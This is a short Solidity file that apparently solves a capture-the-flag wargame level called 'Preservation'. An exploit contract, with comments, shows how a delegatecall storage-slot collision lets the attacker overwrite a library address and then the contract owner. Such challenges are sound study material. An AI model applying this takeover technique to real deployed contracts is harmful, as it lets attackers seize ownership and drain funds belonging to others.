pragma solidity ^0.8;

interface Preservation {
    function setFirstTime(uint256 _timeStamp) external;
}
// The vulnerability is, you can invoke setTime through the delegatecall in setFirstTime
// Means that you can modify slot 0 in -> change the address of timeZone1Library
// then we can invoke setFirstTime again with arb variable as it will change the 
// owner if we create the exploit contract with same storage layout

contract expl {
    address public slot_0;
    address public slot_1;
    uint256 owner;

    function setTime(uint256 _owner) public {
        owner = _owner;
    }
}
